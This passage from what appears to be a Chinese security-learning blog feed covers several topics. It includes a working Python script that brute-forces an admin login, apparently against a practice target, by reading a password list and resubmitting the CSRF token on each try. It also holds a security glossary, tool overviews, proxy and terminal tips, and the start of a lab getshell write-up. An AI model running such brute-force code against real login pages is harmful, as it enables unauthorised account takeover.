class="line">print(soup.find('input',style='display:none')['value'])</span><br><span class="line">#这里用法 是  find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值</span><br></pre></td></tr></tbody></table></figure><h2 id="3-2-字典取list"><a href="#3-2-字典取list" class="headerlink" title="3.2 字典取list"></a>3.2 字典取list</h2><p><a href="https://www.cnblogs.com/mengyu/p/6638975.html" target="_blank" rel="noopener">参考网址1：编码问题</a></p><hr><p>坑点二：文件操作问题 <a href="https://www.cnblogs.com/zarr12steven/p/6206600.html" target="_blank" rel="noopener">参考网址</a></p><p>遇到的情况：</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"03_crake.py"</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;<span class="keyword">module</span>&gt;</span><br><span class="line">    <span class="keyword">get</span> = f.readline()</span><br><span class="line">io.UnsupportedOperation: <span class="keyword">not</span> readable</span><br></pre></td></tr></tbody></table></figure><p>解决方法：open函数里 ‘a’ 改为’r’</p><hr><hr><p>坑点三：rockyou.txt出现编码问题</p><p>原因：rockyou文本太大，里面有一下密码会导致编码出错无法读取之类的</p><p>解决办法：新建一个simple文本，填入大概100个密码</p><hr><hr><p>坑点四：发包之后显示token错误</p><p>原因：发的包里没有sessionid</p><p>解决办法：加进去</p><p>解决代码：<code>s = requests.session()</code></p><p>​            <code>s.get /  s.post</code></p><hr><h2 id="3-3-循环"><a href="#3-3-循环" class="headerlink" title="3.3 循环"></a>3.3 循环</h2><p><code>for get in gets</code></p><h1 id="4-完成！"><a href="#4-完成！" class="headerlink" title="4. 完成！"></a>4. 完成！</h1><p>最后代码如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from distutils.filelist import findall</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">gets = open("C:/Users/Elliot/Desktop/python_req_crack/simple.txt","r").read().splitlines()</span><br><span class="line"></span><br><span class="line">host = "http://打码用***打码用/c/hdyzma/"</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for get in gets:</span><br><span class="line">    contents = s.get(host,proxies={'http': 'http://127.0.0.1:8080'}).content</span><br><span class="line">    soup = BeautifulSoup(contents, "html.parser")</span><br><span class="line"># soup的用法</span><br><span class="line">    token = soup.find('input', style='display:none')['value']</span><br><span class="line"></span><br><span class="line">    #print(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#for line in f.readlines():</span><br><span class="line"></span><br><span class="line">    print(get)</span><br><span class="line">   # print(line)</span><br><span class="line"></span><br><span class="line">#这里用法 是  find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url = host+'welcome.php'</span><br><span class="line">    d = {'name': 'admin','password':get,'token':token }</span><br><span class="line">    r = s.post(url, data=d,proxies={'http': 'http://127.0.0.1:8080'})</span><br><span class="line">    r.encoding = 'UTF-8'</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></tbody></table></figure><p>最后说一句，Python牛逼！（喊破音）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;今日份目标：暴力破解成功&lt;/li&gt;
&lt;li&gt;流程：使用python进行任务&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Python" scheme="https://zzdkl.com.cn/categories/Python/"/>
    
      <category term="Brute force" scheme="https://zzdkl.com.cn/categories/Python/Brute-force/"/>
    
    
      <category term="Python" scheme="https://zzdkl.com.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>SwitchyOmega</title>
    <link href="https://zzdkl.com.cn/2019/08/29/switchOmege/"/>
    <id>https://zzdkl.com.cn/2019/08/29/switchOmege/</id>
    <published>2019-08-29T02:18:25.813Z</published>
    <updated>2019-08-29T02:44:11.533Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>强烈推荐SwitchyOmega！</p><p>插件SwitchyOmega在Chrome和Firefox上都有，强烈推荐需要“文明#PC#上网”的朋友！</p><a id="more"></a><ol><li><a href="https://lighti.me/4025.html" target="_blank" rel="noopener">首先推荐阅读链接：简单配置</a></li></ol><p>配置上图，主要有两个配置</p><p><img src="/upload_image/2019/05/66f5a224ly1fx6o32e1zbj210i0lnwfh.jpg" alt="SwitchyOmega"></p><p><strong>2. 对于PAC没有涉及到的网站，手工进行添加即可</strong></p><p><img src="/upload_image/2019/03/1553676511994.png" alt="1553676511994"></p><p>然后在配置文件中就可以看到添加的文件了，我把配置放上来</p><p><img src="/upload_image/2019/03/1553676637383.png" alt="1553676637383"></p><p>我把网址参数发上来 <code>https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</code></p><p><a href="https://www.flyzy2005.com/tech/switchyomega-proxy-server/" target="_blank" rel="noopener">参考网站2</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;强烈推荐SwitchyOmega！&lt;/p&gt;
&lt;p&gt;插件SwitchyOmega在Chrome和Firefox上都有，强烈推荐需要“文明#PC#上网”的朋友！&lt;/p&gt;
    
    </summary>
    
      <category term="Browers" scheme="https://zzdkl.com.cn/categories/Browers/"/>
    
      <category term="Network" scheme="https://zzdkl.com.cn/categories/Network/"/>
    
      <category term="SwitchyOmega" scheme="https://zzdkl.com.cn/categories/Network/SwitchyOmega/"/>
    
      <category term="Chrome" scheme="https://zzdkl.com.cn/categories/Browers/Chrome/"/>
    
    
      <category term="Proxy" scheme="https://zzdkl.com.cn/tags/Proxy/"/>
    
      <category term="Network" scheme="https://zzdkl.com.cn/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>安全基础知识</title>
    <link href="https://zzdkl.com.cn/2019/08/29/sec_base_knowladge/"/>
    <id>https://zzdkl.com.cn/2019/08/29/sec_base_knowladge/</id>
    <published>2019-08-29T02:16:27.995Z</published>
    <updated>2019-08-29T02:17:14.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>基础知识</p><a id="more"></a><h2 id="1-安全术语"><a href="#1-安全术语" class="headerlink" title="1.安全术语"></a>1.安全术语</h2><blockquote><ol><li><strong>B/S架构</strong>：即浏览器（Browser）和服务器（Server）结构。客户机上只要安装一个浏览器（Browser），如IE，服务器安装Oracle、Nginx或 SQL Server等数据库。浏览器通过Web Server同数据库进行数据交互。 这样就大大简化了客户端电脑载荷，减轻了系统维护与升级的成本和工作量，降低了用户的总体成本。</li><li><strong>C/S结构</strong>：客户机（Client）和服务器（Server）结构，充分利用两端硬件环境的优势，将任务合理分配到Client端和Server端来实现，降低了系统的通讯开销。</li><li><strong>网站漏洞</strong>：也就是<strong>Web漏洞</strong>。随着B/S模式被广泛的应用，用这种模式编写Web应用程序的程序员也越来越多。但由于开发人员的水平和经验参差不齐，相当一部分的开发人员在编写代码的时候，没有对用户的输入数据或者是页面中所携带的信息(如Cookie)进行必要的合法性判断，导致了攻击者可以利用这个编程漏洞来入侵数据库或者攻击Web应用程序的使用者，由此获得一些重要的数据和利益。</li><li><strong>网页木马</strong>：简称“<strong>网马</strong>”。网页木马就是表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马的服务端下载到访问者的电脑上来自动执行。</li><li><strong>渗透测试</strong>：专业人员采用“攻击者心态”，使用实际攻击者利用的相同的工具和技术来探测安全漏洞。渗透测试被广泛认为对系统安全性的最好检验，因为它最接近真实世界的攻击。</li><li><strong>安全基线</strong>：是借用“基线”的概念。字典上对“基线”的解释是：一种在测量、计算或定位中的基本参照。如海岸基线，是水位到达的水位线。类比于“木桶理论”，可以认为安全基线是安全木桶的最短板，或者说，是最低的安全要求。</li><li><strong>OWASP Top 10</strong>：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个非营利组织。OWASP Top 10指该组织发布的10个最常见的WEB攻击方式。</li><li><strong>网络渗透</strong>：指对大型的网络主机服务器群组采用的一种迂回渐进式的攻击方法，通过长期而有计划地逐步渗透攻击进入网络，最终完全控制整个网络。“网络渗透攻击”之所以能够成功，是因为网络上总会有一些或大或小的安全缺陷或漏洞。</li><li><strong>IPS</strong>：入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵预防系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</li><li><strong>Tomcat</strong>:Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。</li><li><strong>JSP</strong>:全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头，以%&gt;结束。</li></ol></blockquote><blockquote><ol start="12"><li><strong>ASP</strong> 指 Active Server Pages （动态服务器页面）,是一项微软公司的技术,运行在IIS 中运行的程序。ASP 文件和 HTML 文件类似，可包含文本、HTML、XML 和脚本。ASP 文件中的脚本可在服务器上执行，文件的扩展名是 “.asp”</li><li><strong>PHP</strong>是 “PHP Hypertext Preprocessor” 的首字母缩略词,是一种被广泛使用的开源脚本语言。PHP 脚本在服务器上执行，使用PHP 没有成本，可供免费下载和使用。一般认为PHP语言是后端语言，与数据库相关</li><li><strong>webshell</strong>（网页后门）：网页后门其实就是一段网页代码，主要以ASP和PHP代码为主。攻击者通过这段精心设计的代码，在服务器端进行某些危险的操作，获得某些敏感的技术信息或者通过渗透，提权获得服务器的控制权。webshell可以穿越服务器防火墙，由于与被控制的服务器或远程过80端口传递的，因此不会被防火墙拦截。并且使用webshell一般不会在系统中留下记录，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹的。插入webshell的过程就叫做<strong>getshell</strong></li><li><strong>hash</strong>：一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。常见算法有MD5,SHA，一般用于文件校验防篡改</li></ol></blockquote><h2 id="2-OSI-TCP-HTTP"><a href="#2-OSI-TCP-HTTP" class="headerlink" title="2. OSI-TCP-HTTP"></a>2. OSI-TCP-HTTP</h2><blockquote><ol><li>OSI 开放式系统互联通信参考模型（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为OSI模型（OSI model），一种概念模型，由国际标准化组织提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。参考价值居多，更常用TCP/IP协议</li><li>TCP/IP 互联网协议（Internet Protocol Suite）是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），其中因为该协议家族的两个核心协议：TCP（传输控制协议）和IP（网际协议）用的最多，所以简称TCP/IP。注意它是一整个协议簇。</li><li>HTTP :待补充。。。</li></ol></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;基础知识&lt;/p&gt;
    
    </summary>
    
      <category term="Sec" scheme="https://zzdkl.com.cn/categories/Sec/"/>
    
    
      <category term="Sec" scheme="https://zzdkl.com.cn/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>安全工具</title>
    <link href="https://zzdkl.com.cn/2019/08/29/sec_tools/"/>
    <id>https://zzdkl.com.cn/2019/08/29/sec_tools/</id>
    <published>2019-08-29T02:11:49.601Z</published>
    <updated>2019-08-29T02:17:01.583Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>安全工具类</p><a id="more"></a><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><h3 id="01-NMAP是什么？"><a href="#01-NMAP是什么？" class="headerlink" title="01 NMAP是什么？"></a>01 NMAP是什么？</h3><blockquote><p>Nmap (“Network Mapper(网络映射器)”) 是一款开源的网络探测和安全审核的工具。用来对网络上的主机进行嗅探，发现。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。</p></blockquote><h3 id="02-NMAP干什么？"><a href="#02-NMAP干什么？" class="headerlink" title="02 NMAP干什么？"></a>02 NMAP干什么？</h3><blockquote><p>Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具。由于Nmap品质卓越，使用灵活，它已经是渗透测试人员必备的工具。除了端口扫描外，Nmap还具备如下功能：主机探测，服务/版本检测（-sV），操作系统检测（-O），网络路由跟踪（-ttl），Nmap脚本引擎（-sC）。</p></blockquote><h3 id="03-有什么功能特点？"><a href="#03-有什么功能特点？" class="headerlink" title="03 有什么功能特点？"></a>03 有什么功能特点？</h3><blockquote><p>灵活。支持数十种不同的扫描方式，支持多种目标对象的扫描。比如单Ping，TCP/UDP/端口扫描<br>强大。Nmap可以用于扫描互联网上大规模的计算机。</p></blockquote><h3 id="04-作用对象（用来扫什么）"><a href="#04-作用对象（用来扫什么）" class="headerlink" title="04 作用对象（用来扫什么）"></a>04 作用对象（用来扫什么）</h3><blockquote><p>一般用来主机扫描，信息收集，端口扫描，主机存活等。带上–script参数可用插件进行强大的扫描。</p></blockquote><h2 id="Brup-Suite"><a href="#Brup-Suite" class="headerlink" title="Brup Suite"></a>Brup Suite</h2><h3 id="01-Brup是什么？"><a href="#01-Brup是什么？" class="headerlink" title="01 Brup是什么？"></a>01 Brup是什么？</h3><blockquote><p>Brup Suite 是用于攻击web应用程序的集成平台。它可以对包进行强大的操作与修改。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p></blockquote><h3 id="02-Brup能干什么？"><a href="#02-Brup能干什么？" class="headerlink" title="02 Brup能干什么？"></a>02 Brup能干什么？</h3><blockquote><p>Burp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。</p></blockquote><h3 id="03-Brup有什么功能特点？"><a href="#03-Brup有什么功能特点？" class="headerlink" title="03 Brup有什么功能特点？"></a>03 Brup有什么功能特点？</h3><blockquote><p>Brup一共有11个功能选项，分别是：<br>        target - 对目标域设置，站点地图爬取目标网站<br>        proxy – Burp Suite设置代理，抓取数据包。<br>        Spider – Burp Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等。<br>        Scanner – 是用来扫描Web应用程序漏洞的，可以发现常见的web安全漏洞，但会存在误报的可能。<br>        Intruder – 可进行Web应用程序模糊测试,进行暴力猜解等。<br>        Repeater – 对数据包进行重放，可分析服务器返回情况，判断修改参数的影响。<br>        Sequencer – 用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试。<br>        Decoder – 对数据进行加解密操作，包含url、html、base64等等。<br>        Comparer – 此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较。<br>        extender - 加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suite的功能。<br>        options - 设置burp，字体，编码等等<br>        alerts - 是用来存放报错信息的，用来解决错误</p></blockquote><blockquote><p><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">使用参考链接</a></p></blockquote><h3 id="04-作用对象（用来干什么）"><a href="#04-作用对象（用来干什么）" class="headerlink" title="04 作用对象（用来干什么）"></a>04 作用对象（用来干什么）</h3><blockquote><p>首先使用burp抓取数据包的proxy功能，设置代理<br>常用Repeater进行重复手工发包测试，Intruder暴力破解</p></blockquote><blockquote><p><a href="http://sec-redclub.com/archives/706/" target="_blank" rel="noopener">使用参考链接</a></p></blockquote><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><h3 id="01-Nessus是什么？"><a href="#01-Nessus是什么？" class="headerlink" title="01 Nessus是什么？"></a>01 Nessus是什么？</h3><blockquote><p>Nessus号称是世界上最流行的漏洞扫描程序。该工具提供完整的电脑主机漏洞扫描服务，并随时更新其漏洞数据库。Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus也是渗透测试重要工具之一。</p></blockquote><h3 id="02-Nessus能干什么？"><a href="#02-Nessus能干什么？" class="headerlink" title="02 Nessus能干什么？"></a>02 Nessus能干什么？</h3><blockquote><p>Nessus通常包括成千上万的最新的漏洞，各种各样的扫描选项，及易于使用的图形界面和有效的报告。</p></blockquote><h3 id="03-Nessus有什么功能特点？"><a href="#03-Nessus有什么功能特点？" class="headerlink" title="03 Nessus有什么功能特点？"></a>03 Nessus有什么功能特点？</h3><blockquote><p>可自行定义插件(Plug-in)。其运作效能能随着系统的资源而自行调整。如果将主机加入更多的资源(例如加快CPU速度或增加内存大小),其效率表现可因为丰富资源而提高。完整支持SSL (Secure Socket Layer)。</p></blockquote><h3 id="04-作用对象"><a href="#04-作用对象" class="headerlink" title="04 作用对象"></a>04 作用对象</h3><blockquote><p>对服务器主机（IP）进行漏洞扫描。对整个网络（不只是内网，同一网段）进行漏扫</p></blockquote><h2 id="WVS"><a href="#WVS" class="headerlink" title="WVS"></a>WVS</h2><h3 id="WVS是什么"><a href="#WVS是什么" class="headerlink" title="WVS是什么"></a>WVS是什么</h3><blockquote><p>WVS(Web Vulnerability Scanner)是一个自动化的Web应用程序安全测试工具。Acunetix公司使用的领先的Web漏洞扫描器，被广泛赞誉为包括最先进的SQL注入和XSS黑盒扫描技术。它自动爬行您的网站，并执行黑盒和灰盒黑客技术，发现危险的漏洞，可能危及您的网站和数据的漏洞。</p></blockquote><h3 id="WVS能干什么？"><a href="#WVS能干什么？" class="headerlink" title="WVS能干什么？"></a>WVS能干什么？</h3><blockquote><p>awvs针对SQL注入、XSS、XXE、SSRF、主机头注入以及4500多个其他web漏洞的精确测试。通过内置的漏洞管理特性，简化了Web应用程序安全过程，这些特性帮助您确定漏洞的优先级并管理漏洞解析.</p></blockquote><h3 id="WVS-特性"><a href="#WVS-特性" class="headerlink" title="WVS 特性"></a>WVS 特性</h3><blockquote><p>黑盒测试<br>深入爬行和分析-自动扫描所有网站。<br>低误报率,漏洞检测率最高。<br>集成漏洞管理-优先级和控制威胁</p></blockquote><h3 id="WVS-作用对象"><a href="#WVS-作用对象" class="headerlink" title="WVS 作用对象"></a>WVS 作用对象</h3><blockquote><p>对web进行漏扫，并输出报告</p></blockquote><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="01-Python是什么？"><a href="#01-Python是什么？" class="headerlink" title="01 Python是什么？"></a>01 Python是什么？</h3><blockquote><p>Python是一种广泛使用的高级编程语言，属于通用型编程语言。它面向对象，解释型的语言。</p></blockquote><h3 id="Pythn能干什么？"><a href="#Pythn能干什么？" class="headerlink" title="Pythn能干什么？"></a>Pythn能干什么？</h3><blockquote><ol><li>数据分析。Numpy &amp; Scipy、Pandas、matplotlib 是 Python 最基本数据分析的三驾马车，而 Jupyter notebook 则是分析的最基本交互式环境。后续则可以学习更为强大的工具，如分布式计算 pyspark，机器学习，深度学习，神经网络等等，Python 都能找到成熟的包以供使用。</li><li>网络数据采集。 数据分析离不开数据采集，使用 Python 的标准库 urllib 去网络采集一些简单数据，图快也会使用 requests，beautifulsoup 是非常不错的 html 解析工具。后续更高级的可以学习 Python 爬虫框架 pyspider，scrapy 等，以及分布式爬虫。</li><li>Web 开发。 主要使用 django 作为开发框架。</li></ol></blockquote><h3 id="Python特性是什么？"><a href="#Python特性是什么？" class="headerlink" title="Python特性是什么？"></a>Python特性是什么？</h3><blockquote><ol><li>其本身拥有一个巨大而广泛的标准库。还可以导入著名第三方库和自建库</li><li>Python的设计哲学强调代码的可读性和简洁的语法（尤其是使用空格缩进划分代码块，而非使用大括号或者关键词）</li><li>Python拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且支持多种编程范式，包括面向对象、命令式、函数式和过程式编程。</li><li>Python是解释型语言，因此没有编译文件</li></ol></blockquote><h3 id="Python-作用对象"><a href="#Python-作用对象" class="headerlink" title="Python 作用对象"></a>Python 作用对象</h3><blockquote><p>开发<br>写出小工具进行批量处理，扫描，漏洞测试<br>写爬虫</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;安全工具类&lt;/p&gt;
    
    </summary>
    
      <category term="Sec" scheme="https://zzdkl.com.cn/categories/Sec/"/>
    
    
      <category term="Sec" scheme="https://zzdkl.com.cn/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>比ConEmu更好用的Cmder</title>
    <link href="https://zzdkl.com.cn/2019/08/29/cmder/"/>
    <id>https://zzdkl.com.cn/2019/08/29/cmder/</id>
    <published>2019-08-29T02:10:31.476Z</published>
    <updated>2019-08-29T02:11:27.021Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天就介绍一个新的工具：Cmder</p><p>这个工具是封装了ConEmu的，比ConEmu更强大<br>分为两个版本，便携版和full版本，full版本更强大，启动也更慢</p><a id="more"></a><h1 id="推荐用法"><a href="#推荐用法" class="headerlink" title="推荐用法"></a>推荐用法</h1><ol><li><p>首先是常开，不关闭，默认切换按钮的</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl+`</span><br></pre></td></tr></tbody></table></figure></li><li><p>打开新的标签叶为</p><figure class="highlight excel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl+<span class="built_in">t</span></span><br></pre></td></tr></tbody></table></figure></li></ol><p>关闭为</p><figure class="highlight stata"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl+<span class="built_in">w</span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li><p>切换用</p><figure class="highlight gauss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl+<span class="built_in">Tab</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>设置成开机自启</p></li></ol><p>其余美化和更好用的点击<a href="https://segmentfault.com/a/1190000011361877" target="_blank" rel="noopener">参考链接</a></p><p>配色方案推荐使用</p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Monokai</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天就介绍一个新的工具：Cmder&lt;/p&gt;
&lt;p&gt;这个工具是封装了ConEmu的，比ConEmu更强大&lt;br&gt;分为两个版本，便携版和full版本，full版本更强大，启动也更慢&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Windows/"/>
    
      <category term="Cmder" scheme="https://zzdkl.com.cn/categories/Windows/Cmder/"/>
    
    
      <category term="Cmder" scheme="https://zzdkl.com.cn/tags/Cmder/"/>
    
  </entry>
  
  <entry>
    <title>靶机getshell</title>
    <link href="https://zzdkl.com.cn/2019/08/29/getshell_in_target_drone/"/>
    <id>https://zzdkl.com.cn/2019/08/29/getshell_in_target_drone/</id>
    <published>2019-08-29T02:07:47.637Z</published>
    <updated>2019-08-29T02:09:21.045Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>某次靶机getshell过程</p><a id="more"></a><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h1><h2 id="01-nmap扫描"><a href="#01-nmap扫描" class="headerlink" title="01. nmap扫描"></a>01. nmap扫描</h2><p>首先对靶机进行nmap全端口版本识别扫描</p><p>扫描结果如下：<a href="#jump_anchor">点击跳转</a></p><p>从nmap扫描，以及配合访问，发现了82，84，85端口是可以访问，有网站存在的</p><p>接下来进行子目录爆破看看后台在哪</p><h2 id="02-扫描子目录"><a href="#02-扫描子目录" class="headerlink" title="02. 扫描子目录"></a>02. 扫描子目录</h2><p>对两个网站进行子目录爆破，第三个85端口已经有登录处了，故跳过</p><p><a href="#jump_82_port">82端口扫描结果</a></p><p><a href="#jump_84_port">84端口扫描结果</a></p><h2 id="03-后续操作"><a href="#03-后续操作" class="headerlink" title="03. 后续操作"></a>03. 后续操作</h2><p>从两个网站后台进去，基本都是弱密码，如果不是，可以考虑用暴力破解，这里就派的上用场了</p><p>82端口的后台登录在<code>/system/</code>    84端口在<code>/admin/</code></p><h1 